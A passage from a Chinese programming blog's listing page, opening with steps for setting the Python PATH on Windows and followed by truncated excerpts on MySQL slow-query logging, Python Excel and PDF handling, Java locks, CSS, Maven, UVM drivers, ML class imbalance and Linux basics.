明明已经安装了 Python，为什么还出现这个错误呢？这里很可能是因为你尚未设置 Python 环境变量。今天小编就手把手教你如何设置 Python 环境变量。 1、首先确定已经安装好了 Python，并且要知道你的 Python 安装到哪个位置了。下图是小编的 Python 安装位置，Python2 和 Python3 都安装了，都默认将其放在了 C 盘。
2、务必要知道 Python 的安装位置，这个事情很重要。有的小伙伴还不知道怎么复制路径，其实只需要点击路径栏，如下图所示。
3、此时路径会铺上一层面纱，之后 Ctrl+C 就可以进行复制了，如下图所示。
4、此时路径会变成类似这样的状态：C:\Python27，反斜杠的路径，这个就是我们想要的结果。当然这个路径是我电脑上的 Python 安装路径，每个人的安装路径可能不一样，只需要找到 Python 安装路径，再将其复制即可。
5、复制好 Python 路径之后，回到桌面，找到 “我的电脑”，右键，选择 “属性”，如下图所示。
6、之后弹出下图的系统界面，然后选择左侧栏目中的 “高级系统设置”。
7、之后弹出 “系统属性” 界面，选择 “高级” 选项卡，再点击右下方的 “环境变量”，如下图所示。
8、之后在弹出的 “环境变量” 对话框中，点击 “PATH”，然后点击 “编辑” 选项卡。
9、之后在弹出的 “编辑用户变量” 的 “变量值” 最后将刚刚复制的路径进行粘贴（快捷键是 Ctrl+V）。特别需要注意的是在路径之前要添加一个分号，该分号是英文状态下的分号，表示与前边的路径分开，是另外一个路径。说白了，就在在变量值下输入 “;C:\Python27” 或者 “; 你的 Python 安装路径” 即可。完成之后，一路点击确定即可。
10、此时输入 cmd，重新打开一个命令行窗口，再次输入 python，如下图所示。此时可以看到 Python 已经成功的设置环境变量了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e76a452ce59503419914d718b915926a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69560452b95a8cb62e19281daeac71a5/" rel="bookmark">
			【MYSQL高级】Mysql找出执行慢的SQL【慢查询日志使用与分析】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 分析慢SQL的步骤慢查询日志（定位慢sql）基本介绍慢查询日志是什么？特别说明 查看慢查询日志是否开以及如何开启设置慢SQL的时间阈值查看阈值设置阈值 查询慢查询日志文件中的总记录条数日志分析模拟慢查询日志分析工具`mysqldumpslow` 文章说明 分析慢SQL的步骤 慢查询的开启并捕获：开启慢查询日志，设置阈值，比如超过5秒钟的就是慢SQL，至少跑1天，看看生产的慢SQL情况，并将它抓取出来explain + 慢SQL分析show Profile。（比explain还要详细，可以查询SQL在MySQL数据库中的执行细节和生命周期情况）运维经理 OR DBA，进行MySQL数据库服务器的参数调优。（后端程序员没有这个权限） 慢查询日志（定位慢sql） 基本介绍 慢查询日志是什么？ MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阈值的语句，具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。
long_query_time的默认值为10，意思是运行10秒以上的语句由慢查询日志来查看哪些SQL超出了我们的最大忍耐时间值，比如一条SQL执行超过5秒钟，我们就算慢SQL，希望能收集超过5秒钟的SQL，结合之前explain进行全面分析 特别说明 **默认情况下，MySQL数据库没有开启慢查询日志，**需要我们手动来设置这个参数。
当然，如果不是调优需要的话，一般不建议启动该参数，因为开启慢查询日志会或多或少带来一定的性能影响。慢查询日志支持将日志记录写入文件。
查看慢查询日志是否开以及如何开启 查看慢查询日志是否开启：SHOW VARIABLES LIKE '%slow_query_log%';。开启慢查询日志：SET GLOBAL slow_query_log = 1;。使用该方法开启MySQL的慢查询日志只对当前数据库生效，如果MySQL重启后会失效。 -- 指定数据库 mysql&gt; use advanced_mysql_learning; Database changed -- 查看慢查询日志是否开启 mysql&gt; SHOW VARIABLES LIKE '%slow_query_log%'; +---------------------+---------------------------------------------------------------------------+ | Variable_name | Value | +---------------------+---------------------------------------------------------------------------+ | slow_query_log | OFF | | slow_query_log_file | D:\Development\Sql\Mysql\mysql8\exe\mysql-8.0.27-winx64\data\dam-slow.log | +---------------------+---------------------------------------------------------------------------+ 2 rows in set, 1 warning (0.00 sec) -- 开启慢查询日志 mysql&gt; SET GLOBAL slow_query_log = 1; Query OK, 0 rows affected (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69560452b95a8cb62e19281daeac71a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8eca9ed9e14902288cd17df745463cf6/" rel="bookmark">
			基于java在线个人网站源码设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘 要
随着社会及个人社交应用平台的飞速发展，人们的沟通成本逐渐降低，互联网信息的普及也进一步提升了人们对于信息的需求度，通过建立个人网站的方式来展示自己的生活信息同时利用平台结交新的朋友，借助个人网站平台的搭建不仅可以实现个人信息及喜好的发布，同时可以借助个人平台实现相册的建立以及日志的分享，从而实现个性化网络平台的定制，通过个人网站的信息分享、交流、及传递来实现与他人的互动交流。目前主流的个人网站平台包括人们所熟悉的Facebook、微博以及QQ空间等，借助系统或者应用平台打造专属个人空间，通过个人空间可以实现音乐、相册及日志内容的分享，同时可以通过网站平台了解到身边朋友的生活动态及最新相册内容查看，利用个人网站分享美食、音乐及书籍信息帮助推动互联网平台交友需求，同时满足用户的社交需求、娱乐需求及知识需求。
本文结合社交网络平台的发展趋势，以及人们对于个人网站平台的需求空间，借助JSP技术以及SSM框架实现了个人网站平台的搭建，利用WEB服务器实现前后端数据信息的交互及管理，用户可以通过个人网站平台实现个人视频、音乐及日志内容的分享，通过平台用户信息提供来发现志趣相投的网友，同时结合相册管理以及音乐视频管理工具来实现信息内容的发布和上传，满足用户交友需求及娱乐功能需求。
关键词：JSP技术；SSM框架；Mysql数据库；个人网站；相册管理
Design and implementation of personal website based on JSP
Abstract
With the rapid development of social and personal social application platforms, people’s communication costs have been gradually reduced, and the popularity of Internet information has further increased people’s demand for information. Through the establishment of personal websites, people can display their life information and make new friends with the platform. With the help of the establishment of personal website platforms, personal information and preferences can be released, At the same time, the establishment of photo albums and the sharing of logs can be realized through the personal platform, so as to realize the customization of personalized network platform, and realize the interactive communication with others through the information sharing, communication and transmission of personal websites.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8eca9ed9e14902288cd17df745463cf6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f594076bf495c767e80b32fef42d8ff/" rel="bookmark">
			实现字符计数功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		## 方法二：使用collections模块
使用Python内置的collections模块，其中Counter类可以快速实现字符计数功能。
```python
from collections import Counter
def char_count(string):
char_counts = Counter(string)
return char_counts
```
使用方法相当简单，只需调用`char_count`函数并将需要查询的字符串传递给该函数，如下所示：
```python
string = "hello world"
char_counts = char_count(string)
print(char_counts)
```
输出结果如下：
```python
Counter({'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1})
```
以上两种方法都可以实现统计字符串中字符数量的功能，使用方法取决于个人的习惯和工作需求。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00c8ce9cbd058a4b46c5fbf7e85cc29f/" rel="bookmark">
			Python数据处理之导入导出excel数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python的一大应用就是数据分析了，而数据分析中，经常碰到需要处理Excel数据的情况。这里做一个Python处理Excel数据的总结，基本受用大部分情况。相信以后用Python处理Excel数据不再是难事儿！
xlwt库将数据导入Excel 将数据写入一个Excel文件
wb = xlwt.Workbook() # 添加一个表 ws = wb.add_sheet('test') # 3个参数分别为行号，列号，和内容 # 需要注意的是行号和列号都是从0开始的 ws.write(0, 0, '第1列') ws.write(0, 1, '第2列') ws.write(0, 2, '第3列') # 保存excel文件 wb.save('./test.xls') 可以看到，用xlwt库操作非常简单，基本就三步走：
打开一个Workbook对象，并用add_sheet方法添加一个表然后就是用write方法写入数据最后用save方法保存 需要注意的是，xlwt库里面所定义的行和列都是从0开始计数的
定制Excel表格样式
表格样式一般主要有这么几块内容：字体、对齐方式、边框、背景色、宽度以及特殊内容，比如超链接、日期时间等。下面我们来分别看看用xlwt库怎么定制这些样式。
字体
xlwt库支持的字体属性也比较多，大概如下：
设置字体需要用到xlwt库的XFStyle类和Font类，代码模版如下：
style = xlwt.XFStyle() # 设置字体 font = xlwt.Font() # 比如设置字体加粗和下划线 font.bold = True font.underline = True style.font = font # 然后应用 ws.write(2, 1, 'test', style) 后续几个属性的设置都是类似的，都是4步走：
拿到XFStyle拿到对应需要的属性，比如这里的Font对象设置具体的属性值最后就是在write方法写入数据的时候应用就行 单元格对齐
先来看单元格对齐怎么设置
# 单元格对齐 alignment = xlwt.Alignment() # 水平对齐方式和垂直对齐方式 alignment.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00c8ce9cbd058a4b46c5fbf7e85cc29f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b85dbacddad34d91182e7000e7b7b7fd/" rel="bookmark">
			Idea 2023.2 maven 打包时提示 waring 问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Version idea 2023.2
问题 使用 Maven 打包 ，控制台输出 Waring 信息
[WARNING] [WARNING] Plugin validation issues were detected in 7 plugin(s) [WARNING] [WARNING] * org.apache.maven.plugins:maven-dependency-plugin:3.3.0 [WARNING] * org.apache.maven.plugins:maven-resources-plugin:3.2.0 [WARNING] * org.apache.maven.plugins:maven-jar-plugin:3.2.2 [WARNING] * org.apache.maven.plugins:maven-install-plugin:2.5.2 [WARNING] * org.apache.maven.plugins:maven-compiler-plugin:3.10.1 [WARNING] * org.apache.maven.plugins:maven-surefire-plugin:2.22.2 [WARNING] * cn.zhangfusheng:business-help-maven-plugin:3.0.0-SNAPSHOT [WARNING] [WARNING] For more or less details, use 'maven.plugin.validation' property with one of the values (case insensitive): [BRIEF, DEFAULT, VERBOSE] [WARNING] 问题分析 根本原来在于所使用的 Maven 版本
idea 2023.2 内置的 Maven 版本为 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b85dbacddad34d91182e7000e7b7b7fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f59f695e63547f9c15d979977a9a8f52/" rel="bookmark">
			空元素不占用位置处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 问题场景： 如果将一个元素的CSS设置为margin-right: 10px，即使这个元素为空，那么这10px依然存在，效果如下：
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; span { margin-right: 10px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;span&gt;你好&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;helloWord&lt;/span&gt; &lt;/body&gt; &lt;/html&gt; 渲染效果如下：
二. 解决方案： 利用伪元素:empty，如果该元素为空，则设置display为none掉。
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; span { margin-right: 10px; } span:empty { display: none; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;span&gt;你好&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;helloWord&lt;/span&gt; &lt;/body&gt; &lt;/html&gt; 渲染效果如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bac179e71d437030859b8e285b930c4/" rel="bookmark">
			AHBRAM验证（3）——AHB master driver初步实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一. lvc_ahb_driver代码二. lvc_ahb_master_driver代码三. lvc_ahb_if 更新 一. lvc_ahb_driver代码 在这段代码中，主要是接收到seq后将他发送到对应的sequencer中在uvm_driver中，uvm专门定义了端口uvm_seq_item_pull_port#(REQ,)RSP seq_item_port和方法get_next_item(output REQ)，item_done(input RSP)，用于接收数据；在代码中，通过端口seq_item_port调用get_next_item方法来获取item，获得了item后将调用函数drive_transfer将item发送出去，最后driver调用 item_done告知sequence自己完成数据的传输需要注意的是 void'($cast(rsp, req.clone()));，虽然在定义时使用了参数指定了req是子类句柄，但是clone函数的返回值是uvm_object，所以必须调用$cast将句柄转换为子类句柄rsp.set_sequence_id(req.get_sequence_id()); rsp.set_transaction_id(req.get_transaction_id());这段代码的作用是防止存在多个sequence在同一个sequencer上启动的清况，sequencer不知道将response返回给哪个sequence。 `ifndef LVC_AHB_DRIVER_SV `define LVC_AHB_DRIVER_SV class lvc_ahb_driver #(type REQ = lvc_ahb_transaction, RSP = REQ) extends uvm_driver #(REQ, RSP); `uvm_component_utils(lvc_ahb_driver) function new(string name = "lvc_ahb_driver", uvm_component parent ); super.new(name, parent); endfunction function void build_phase(uvm_phase phase); super.build_phase(phase); endfunction function void connect_phase(uvm_phase phase); super.connect_phase(phase); endfunction task run_phase(uvm_phase phase); super.run_phase(phase); fork get_and_drive(); reset_listener(); join_none endtask virtual task get_and_drive(); forever begin seq_item_port.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bac179e71d437030859b8e285b930c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb56d315a2df736a2f6c79d16e0cb631/" rel="bookmark">
			ide运行报错“Command line is too long”解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有时运行程序时，ide会报如下错，如何解决呢，其实提示已经告诉你解决办法了。点击图中的蓝色超链接： “JAR MAINIFEST” 或 “CLASSPATH FILE” 都能解决问题
这是因为命名的方法名太长了才会报这个错
方法2
如果没有弹窗，也可以找到ide左上角，红色方框位置，点击
选择编辑配置
选择下图红框位置
选择箭头指向任意一个选项，点击确定即可； 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6398c0b1d9ffa1a54fa3f261989d318/" rel="bookmark">
			详解ReentrantLock---可重入锁(小白易懂)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		详解ReentrantLock(小白易懂) 初识ReentrantLock ReentrantLock是可重入的互斥锁，虽然具有与synchronized相同功能，但是会比synchronized更加灵活（具有更多的方法）。 ReentrantLock底层基于AbstractQueuedSynchronizer实现 AbstractQueuedSynchronizer抽象类定义了一套多线程访问共享资源的同步模板，解决了实现同步器时涉及的大量细节问题，能够极大地减少实现工作， 用大白话来说，AbstractQueuedSynchronizer为加锁和解锁过程提供了统一的模板函数，只有少量细节由子类自己决定。 ReentrantLock结构组成 学任何知识的第一件事，就是看清它的全貌，梳理出整体结构与主流程，之后逐个击破，所以带读者们先看下ReentrantLock整体结构组成， 对它的实现有个大致的了解。 上图可以看出来，ReentrantLock整体结构还是非常简单，给读者们分析一波，为什么ReentrantLock结构是这样设计的， 首先ReentrantLock实现了Lock接口，Lock接口是Java中对锁操作行为的统一规范，遵守规则规范是守法公民的基本素养，合情合理，Lock接口的定义如下: public interface Lock { /** * 获取锁 */ void lock( ); /** * 获取锁-响应中断 */ void lockInterruptibly() throws InterruptedException; /** * 返回获取锁是否成功状态 */ boolean tryLock(): /** * 返回获取锁是否成功状态-响应中断 */ boolean tryLock(long time, TimeUnit unit) throws InterruptedException; /** * 释放锁 */ void unlock(); /** * 创建条件变量 */ Condition newCondition(): } Lock接口定义的函数不多，接下来ReentrantLock要去实现这些函数，遵循着解耦可扩展设计，ReentrantLock内部定义了专门的组件Sync， Sync继承AbstractQueuedSynchronizer提供释放资源的实现，NonfairSync和FairSync是基于Sync扩展的子类， 即ReentrantLock的非公平模式与公平模式，它们作为Lock接口功能的基本实现。 大白话来说，企业的老板，为了响应政府的政策，需要对企业内部做调整，但是政府每年政策都不一样，每次都要自己去亲力亲为，索性长痛不如短痛， 专门成立一个政策应对部门，以后这些事情都交予这个部门去做，老板只需要指挥它们就好了。 清楚了ReentrantLock结构组成之后，下面我只需对Sync、NonfairSync、FairSync逐个击破，ReentrantLock自然水到渠成。 小贴士：在ReentrantLock中，它对AbstractQueuedSynchronizer的state状态值定义为线程获取该锁的重入次数， state状态值为0表示当前没有被任何线程持有，state状态值为1表示被其他线程持有，因为支持可重入，如果是持有锁的线程，再次获取同一把锁， 直接成功，并且state状态值+1，线程释放锁state状态值-1，同理重入多次锁的线程，需要释放相应的次数。 Sync Sync可以说是ReentrantLock的亲儿子，它寄托了全村的希望，完美的继承了AbstractQueuedSynchronizer，是ReentrantLock的核心， 后面的NonfairSync与FairSync都是基于Sync扩展出来的子类。以下是Sync类定义的核心部分: abstract static class Sync extends AbstractQueuedSynchronizer { private static final long serialversionUID = -5179523762034025860L; //获取锁-子类实现 abstract void lock(); //非公平-获取资源 final boolean nonfairTryAcquire(int acquires) { //获取当前线程 final Thread current = Thread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6398c0b1d9ffa1a54fa3f261989d318/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb1d8d692a304a1c281316c16db998d3/" rel="bookmark">
			运用Python抓取PDF表格中的特定数据并生成Excel文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在工作中遇到了一个问题，需要把PDF中的地方债数据粘贴到Excel表格中，在PDF的每个表格中需要找到“金额”“本息和”“项目总收益”“项目名称”“项目类型”……等等数据。每一页表格需要复制粘贴十次，一共四百多页的PDF岂不是要复制粘贴八千次！眼瞎了都粘不完吧！于是我开始尝试用Python来读取PDF表格，然后找到每个表格对应位置的数据，对应到新生成的序列中，最后导出为Excel。
如图一，这是PDF中每一页记录的地方债项目数据。
我需要的Excel表格如下图所示：
接下来就是代码展示：
处理单页PDF的代码 首先运用pdfplumber，如果没有安装需要先安装：
pip install pdfplumber
安装后就可以开始使用了：
import pdfplumber #导入使用的库 # 读取pdf文件,使用的时候改成自己的路径就行 pdf = pdfplumber.open('D://test1.pdf') # 访问第一页（使用时改成自己需要的页码即可，页码-1等于[]中需要填的数字 first_page = pdf.pages[0] # 自动读取表格信息,返回列表 table = first_page.extract_table() print(table) 我读取了对应页码的数据，输出结果如下：
这些数据看起来乱七八糟的，我需要把其中的“None”给去掉：
table = [[cell for cell in row if cell is not None and cell != ''] for row in table] #table中乱七八糟的none就被去掉了 #接下来将列表转化为dataframe的结构，然后就可以进行进一步操作了 import pandas as pd # 将列表转化为dataframe table_data = pd.DataFrame(table) table_data 这是输出的结果，我们可以看到，已经出现了表格的形状，接着我们就可以精准定位我们想要的数据所在的位置了，例如第一行第二列的那个数据，就可以表示为table[0][1]
接下来的代码如下：
#生成一个新的表格序列，用来存储我们抓取到的数据 df = pd.DataFrame(columns=["城市", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb1d8d692a304a1c281316c16db998d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eda55cfbc959772e7f513f6837be9ddc/" rel="bookmark">
			软件系统版本号详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 背景软件版本阶段说明Base版Alpha版Beta版RC版（Release Candidate）Release版 版本命名规范第1部分：x1他是作为主版本号第2部分：x2他是作为子版本号第3部分：x3他是作为修正版本号第4部分：x4他是作为日期版本号_希腊字母版本号 版本号的阶段标识参考 背景 最近在整理关于软件著作权材料，其中一项涉及到了软件版本号，所以整理一下软件版本号的相关内容
软件版本阶段说明 Base版 此版本他表示的是该软件目前仅仅是一个假页面链接，一般他是包含了所有的功能以及页面布局，但是页面中的功能却没有做完整的实现，只是作为整体网站的一个基础架构。
Alpha版 此版本他表示的是该软件在此阶段，标识内部测试版。α是希腊字母的第一个，主要是以实现软件功能为主，一般只在软件开发者组内进行交流。也就是，该版本软件的Bug较多，需要继续跟进修复bug。
Beta版 β是希腊字母的第二个，标识公开测试版。该版本相对于α版已有了很大发展以及改进，消除了严重的异常，但还是存在着一些缺陷，需要经过很多次的测试来进一步消除问题。这个版本主要的是对软件的UI进行修改调整。
RC版（Release Candidate） 该版本已经很成熟了，基本上可以说，不存在导致错误的BUG，与即将发行的正式版相差无几。
Release版 该版本意味“最终版本”，在经过之前版本的一系列测试之后，来到了一个正式版本，是最终交付用户使用的一个版本。该版本也会被称为标准版。通常情况下，Release不会以单词形式出现在软件封面上，而是会有一个符号(Ｒ)。
版本命名规范 软件版本号是由4部分组成的，x1.x2.x3.x4。分别如下：
第1部分：x1他是作为主版本号 当功能模块进行较大的改动。比如增加多个功能模块或者整体架构升级。此版本号由项目主管决定是否修改
第2部分：x2他是作为子版本号 当功能有了一定的增加或者变化。比如增加了对权限控制、视图等功能。此版本号由项目主管决定是否修改。
第3部分：x3他是作为修正版本号 一般是 Bug 修复或是一些小的改动，应该是经常发布修订版本，时间间隔不进行限定，修复一个严重的bug的时候就可以发布一个修订版。此版本号由项目主管决定是否修改。
第4部分：x4他是作为日期版本号_希腊字母版本号 当前日期，用于记录修改项目的，每天对项目的修改都需要进行更改日期版本号。此版本号由开发人员自行决定是否修改。
希腊字母版本号(beta等)：他是用于标注当前版本的软件处于哪个开发阶段的，当软件进入到另一个阶段的时候，就需要修改此版本号。此版本号由项目主管决定是否修改。
希腊字母版本号分为5个部分，他们分别是：base、alpha、beta、RC、release
举个栗子：v1.0.2.20230728_base
常规版本号定义：完全的版本号定义，分三项：：&lt;主版本号&gt;.&lt;子版本号&gt;.&lt;修订版本号&gt;，如 1.0.0
版本号的阶段标识 软件的每个版本中他包括11个阶段，具体阶段描述如下：
项目Value需求控制a设计阶段b编码阶段c单元测试d单元测试修改e集成测试f集成测试修改g系统测试h系统测试修改i验收测试j验收测试修改k 参考 以下是在百度百科中查询到的内容，提供了如下版本阶段，大家可自行参考
Trial：试用版，软件在功能或时间上有所限制，如果想解除限制，需要购买零售版。
Retail：零售版。
Free：免费版。
Full：完全版。
Alpha：内部测试版，通常在Beta版发布之前推出。
Beta：测试版，正式版推出之前发布的版本。以上两种测试版本Bug可能较多。
Final：正式版，软件的正式版本，修正了Alpha版和Beta版的Bug。
SR：修正版或更新版，修正了正式版推出后发现的Bug。
Pro：专业版，需要注册后才能解除限制，否则为评估版本。
Plus：加强版。
Delux：豪华版。Plus版和Delux版区别不大，比普通版本多了一些附加功能。
Build：内部标号，同一版本可以有多个Build号，通常Build后面的数字越大，软件版本越新。某些软件后面的数字为发布时间，例如：Windows 优化大师 v5.4 Build 602。
欢迎大点击下方卡片，关注《coder练习生》
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aa6fe0522a4695ea56174603a65297b/" rel="bookmark">
			机器学习——样本不均衡学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、样本不均衡定义 一般在分类机器学习中，每种类别的样本是均衡的，也就是不同目标值的样本总量是接近的，但是在很多场景下的样本没有办法做到理想情况，甚至部分情况本身就是不均衡情况：
（1）很多场景下，数据集本身不平和，部分类别的数据多于其他数据；
（2）固定场景下，例如风控的场景，负样本的比例远远小于正样本的占比；
（3）梯度下降过程中，不同类别的样本量比较大时，模型本身很难做到收敛最优解。
2、解决方案 不同场景下，对样本不均衡的解决方案侧重点不同，下面以金融风控举例：
（1）下探法：将被拒绝的用户放进来，充当负样本。缺点也很明显，容易风险高，成本也较高；
（2）代价敏感：对少数样本进行加权处理，让模型进行均衡训练；
（3）采样法：通过多正样本进行欠采样，或者负样本进行过采样的方式平衡样本；
（4）半监督学习
2.1 代价敏感 通过改变少数样本的权重，从而让模型得到一定的均衡训练。但是代价敏感加权增大了负样本在模型中的贡献度，但本身并没有为模型增加额外的信息，这就没有办法解决选择偏误的问题，也没办法带来负面影响。
在逻辑回归中就可以通过参数class_weight='balanced’来调整正负样本的权重，我们以逻辑回归评分卡为例，调整逻辑回归的class_weight的参数，看看结果，该例子链接：逻辑回归评分卡
# 导入模块 import pandas as pd from sklearn.linear_model import LogisticRegression from sklearn.metrics import roc_auc_score,roc_curve,auc data = pd.read_csv('Bcard.txt') feature_lst = ['person_info','finance_info','credit_info','act_info'] # 划分数据 train = data[data.obs_mth != '2018-11-30'].reset_index().copy() val = data[data.obs_mth == '2018-11-30'].reset_index().copy() x = train[feature_lst] y = train['bad_ind'] val_x = val[feature_lst] val_y = val['bad_ind'] # 查看正负样本的数量 print('训练集：\n',y.value_counts()) print('跨时间验证集：\n',val_y.value_counts()) # 训练模型 lr_model = LogisticRegression(C=0.1) lr_model.fit(x,y) # 训练集 print('参数调整前的ks值') y_pred = lr_model.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4aa6fe0522a4695ea56174603a65297b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19876399351c915276d78e90431573d1/" rel="bookmark">
			Linux 面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是Linux的内核？作用是？ Linux 内核是 Linux 操作系统的核心组件，它是操作系统的底层软件，负责管理计算机的硬件资源，并提供了一些基本的系统服务。内核是操作系统与硬件之间的桥梁，它处理系统中的进程调度、内存管理、设备驱动程序、文件系统以及网络通信等核心功能。
Linux 内核是 Linux 操作系统的核心组件，它具有以下几个主要作用：
1. 系统资源管理：Linux 内核负责管理计算机的硬件资源，包括处理器、内存、磁盘、网络接口等。它通过进程调度、内存管理、设备驱动程序等机制，合理地分配和管理这些资源，以提供高效的系统性能和稳定性。
2. 进程管理：内核负责创建、调度和终止进程。它为每个进程分配资源，包括内存空间、文件描述符、CPU 时间片等，并控制进程之间的通信和同步。
3. 内存管理：内核管理计算机的物理内存和虚拟内存。它负责分配和回收内存资源，以满足进程的需求，并提供内存保护和虚拟内存机制，使得每个进程都能在独立的地址空间中运行。
4. 设备管理：内核通过设备驱动程序与硬件设备进行交互，管理计算机上的各种设备，如磁盘驱动器、网络接口卡等。它提供了统一的接口和抽象，使应用程序可以方便地使用和控制这些设备。
5. 文件系统：内核提供文件系统接口，用于管理文件和目录。它负责文件的创建、读取、写入和删除等操作，并实现文件的访问权限控制和文件系统的一致性。
6. 网络通信：内核负责处理网络通信，包括协议栈的实现、网络接口的管理和数据包的传输。它提供了各种网络协议和接口，使得应用程序可以进行网络通信。
7. 安全性和权限：内核实施安全策略，控制对系统资源的访问权限，并提供用户身份验证和安全性功能。它确保只有授权的用户和进程能够访问敏感数据和系统资源。
总之，Linux 内核是 Linux 操作系统的核心，它提供了操作系统的基本功能和服务，是操作系统与硬件之间的桥梁。它使得应用程序能够运行和交互，并提供了高效、安全和可靠的系统环境。
2.Linux文件系统 Linux 文件系统是一种用于组织和管理文件和目录的结构，它是操作系统中的核心组成部分。Linux 支持多种文件系统，其中一些是专门为 Linux 开发的，而其他一些是从其他操作系统移植过来的。
以下是一些常见的 Linux 文件系统：
1. ext4：ext4（第四扩展文件系统）是 Linux 中最常用的文件系统之一。它是对 ext3 文件系统的改进，支持更大的文件和分区大小，并提供更高的性能和可靠性。
2. XFS：XFS 是一个高性能的日志文件系统，最初由 SGI 开发。它支持大容量存储和高并发访问，并具有快速恢复能力。
3. Btrfs：Btrfs（B-tree 文件系统）是一个先进的复制文件系统，具有快照、压缩、校验和等特性。它旨在提供高性能、可靠性和可扩展性。
4. ZFS：ZFS 是一个先进的文件系统和存储管理解决方案，最初由 Sun Microsystems 开发。它支持快照、数据完整性校验、自动修复等特性，并具有强大的存储管理能力。
5. ext3：ext3（第三扩展文件系统）是 ext2 文件系统的改进版本，引入了日志功能以提高数据一致性和恢复能力。
除了上述文件系统之外，还有其他一些文件系统可供选择，如ReiserFS、JFS等。选择适合的文件系统取决于你的需求，包括性能、可靠性、扩展性和特殊功能等方面。
在 Linux 中，文件系统被挂载到目录树的不同位置，以便访问其内容。通过使用命令行工具，如`df`和`mount`，可以查看已挂载的文件系统和其相关信息。
总结起来，Linux 文件系统是用于组织和管理文件和目录的结构。Linux 提供了多种文件系统选项，每个文件系统都有其特定的优点和用途。选择合适的文件系统对于实现高性能、高可靠性和高扩展性的存储解决方案非常重要。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19876399351c915276d78e90431573d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3873857a70267faf0ddf218436a0e597/" rel="bookmark">
			H5界面键盘弹起，整个界面上移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说下基本的问题，就是点击选择门店，会从下面弹出一个弹框，出现门店列表，然后列表上方会有一个搜索框，搜索门店，当点击搜索框时会弹起键盘，导致整个弹框上移，可能会导致搜索框跳出整个界面，如下图所示，如果字体或整个界面过大，搜索框就会跳出可视区域
具体解决方法，如果是App环境的话直接可以在uniapp中的pages.js页面配置界面设置一个属性即可如下图所示，但是我这个是H5环境是直接挂在企业微信上面的，这个属性就不管用。
